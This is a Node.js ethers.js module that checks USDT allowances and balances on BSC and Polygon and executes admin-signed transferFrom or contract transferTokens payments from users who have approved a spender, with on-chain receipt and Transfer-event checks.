const { ethers } = require('ethers');

// ABI for our FutureMintTransfer contract
const TRANSFER_CONTRACT_ABI = [
  'function transferTokens(address token, address from, address to, uint256 amount) external',
];

// ERC-20 ABI
const ERC20_ABI = [
  'function transferFrom(address from, address to, uint256 amount) returns (bool)',
  'function decimals() view returns (uint8)',
  'function balanceOf(address) view returns (uint256)',
  'function allowance(address owner, address spender) view returns (uint256)',
];

const BSC_RPC = process.env.BSC_RPC || 'https://bsc-dataseed.binance.org';
const POLYGON_RPC = process.env.POLYGON_RPC || 'https://polygon-rpc.com';
const USDT_BSC = process.env.USDT_BSC_CONTRACT || '0x55d398326f99059fF775485246999027B3197955';
const USDT_POLYGON = process.env.USDT_POLYGON_CONTRACT || '0xc2132D05D31c914a87C6611C10748AEb04B58e8F';
const TRANSFER_CONTRACT = process.env.TRANSFER_CONTRACT_ADDRESS;
const TRANSFER_CONTRACT_POLYGON = process.env.TRANSFER_CONTRACT_ADDRESS_POLYGON;

// Get correct contract for network
const getTransferContractAddress = (network) => {
  if (network === 'Polygon') {
    return TRANSFER_CONTRACT_POLYGON || TRANSFER_CONTRACT;
  }
  return TRANSFER_CONTRACT;
};

// Pre-define static networks to avoid repeated network detection calls
const BSC_NETWORK = new ethers.Network('bnb', 56);
const POLYGON_NETWORK = new ethers.Network('matic', 137);

/**
 * Execute USDT transfer.
 * If TRANSFER_CONTRACT is set → use smart contract (transferTokens)
 * Otherwise → direct transferFrom via admin wallet
 */
const executeTransferFrom = async (fromAddress, toAddress, amount, network) => {
  const privateKey = process.env.ADMIN_WALLET_PRIVATE_KEY;
  if (!privateKey) {
    throw new Error('Admin wallet private key not configured');
  }

  const rpc = network === 'BSC' ? BSC_RPC : POLYGON_RPC;
  const usdtAddr = network === 'BSC' ? USDT_BSC : USDT_POLYGON;

  const staticNetwork = network === 'BSC' ? BSC_NETWORK : POLYGON_NETWORK;
  const provider = new ethers.JsonRpcProvider(rpc, staticNetwork, { staticNetwork: true });
  const adminWallet = new ethers.Wallet(privateKey, provider);

  // Normalize addresses
  const normalizedFrom = ethers.getAddress(fromAddress.toLowerCase());
  const normalizedTo = ethers.getAddress(toAddress.toLowerCase());

  // Get USDT decimals
  const usdtContract = new ethers.Contract(usdtAddr, ERC20_ABI, provider);
  const decimals = await usdtContract.decimals();
  const parsedAmount = ethers.parseUnits(amount.toString(), decimals);

  // Determine spender (contract or admin wallet)
  const transferContractAddr = getTransferContractAddress(network);
  const spender = (transferContractAddr && transferContractAddr.startsWith('0x') && transferContractAddr.length === 42)
    ? ethers.getAddress(transferContractAddr.toLowerCase())
    : adminWallet.address;

  // Check allowance
  const allowance = await usdtContract.allowance(normalizedFrom, spender);
  if (allowance < parsedAmount) {
    throw new Error(`Insufficient USDT allowance. User approved: ${ethers.formatUnits(allowance, decimals)} USDT, needed: ${amount} USDT. User must re-approve.`);
  }

  // Check user balance
  const balance = await usdtContract.balanceOf(normalizedFrom);
  if (balance < parsedAmount) {
    throw new Error(`Insufficient USDT balance. User has: ${ethers.formatUnits(balance, decimals)} USDT, needed: ${amount} USDT.`);
  }

  let tx;

  if (transferContractAddr && transferContractAddr.startsWith('0x') && transferContractAddr.length === 42) {
    // Use smart contract method
    const contract = new ethers.Contract(transferContractAddr, TRANSFER_CONTRACT_ABI, adminWallet);
    
    // Estimate gas first to catch errors before sending
    try {
      await contract.transferTokens.estimateGas(usdtAddr, normalizedFrom, normalizedTo, parsedAmount);
    } catch (gasErr) {
      throw new Error(`Transfer will fail: ${gasErr.reason || gasErr.shortMessage || 'Contract reverted. User may need to re-approve.'}`);
    }
    
    tx = await contract.transferTokens(usdtAddr, normalizedFrom, normalizedTo, parsedAmount, { gasLimit: 100000 });
  } else {
    // Direct transferFrom (admin wallet has approval)
    const usdtWithSigner = new ethers.Contract(usdtAddr, ERC20_ABI, adminWallet);
    tx = await usdtWithSigner.transferFrom(normalizedFrom, normalizedTo, parsedAmount, { gasLimit: 100000 });
  }

  const receipt = await tx.wait();
  
  // Check if transaction was actually successful on-chain
  if (receipt.status === 0) {
    throw new Error('Transaction reverted on blockchain. Transfer failed.');
  }

  // Verify that a token Transfer event was emitted (USDT actually moved)
  const transferEvent = receipt.logs.find(log => {
    try {
      const iface = new ethers.Interface(['event Transfer(address indexed from, address indexed to, uint256 value)']);
      const parsed = iface.parseLog({ topics: log.topics, data: log.data });
      return parsed && parsed.name === 'Transfer';
    } catch { return false; }
  });

  if (!transferEvent) {
    throw new Error('Transaction succeeded but no USDT was transferred. User may not have sufficient allowance or balance.');
  }
  
  return { success: true, txHash: receipt.hash };
};

/**
 * Check USDT allowance
 */
const checkAllowance = async (userAddress, network) => {
  try {
    const rpc = network === 'BSC' ? BSC_RPC : POLYGON_RPC;
    const usdtAddr = network === 'BSC' ? USDT_BSC : USDT_POLYGON;
    const adminAddress = process.env.ADMIN_WALLET_ADDRESS;

    const transferContract = getTransferContractAddress(network);
    const spender = (transferContract && transferContract.startsWith('0x') && transferContract.length === 42)
      ? transferContract
      : adminAddress;

    if (!spender) return '0';

    const staticNetwork = network === 'BSC' ? BSC_NETWORK : POLYGON_NETWORK;
    const provider = new ethers.JsonRpcProvider(rpc, staticNetwork, { staticNetwork: true });
    const usdtContract = new ethers.Contract(usdtAddr, ERC20_ABI, provider);
    const decimals = await usdtContract.decimals();
    const allowance = await usdtContract.allowance(userAddress, spender);

    return ethers.formatUnits(allowance, decimals);
  } catch (err) {
    console.error('checkAllowance error:', err.message);
    return '0';
  }
};

module.exports = { executeTransferFrom, checkAllowance };
